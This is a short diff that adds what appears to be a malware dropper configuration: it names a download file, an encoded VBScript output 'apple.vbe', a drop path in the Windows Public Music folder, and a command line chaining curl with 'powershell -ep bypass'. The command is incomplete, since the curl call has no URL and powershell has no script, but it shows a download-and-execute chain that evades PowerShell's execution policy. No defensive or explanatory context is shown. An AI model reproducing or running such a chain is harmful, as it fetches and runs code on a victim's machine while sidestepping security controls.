@@ -1,0 +1,5 @@
+[config]
+download = first.ini
+output = apple.vbe
+path = C:\Users\Public\Music\
+cmd /c curl -o first.ini && powershell -ep bypass
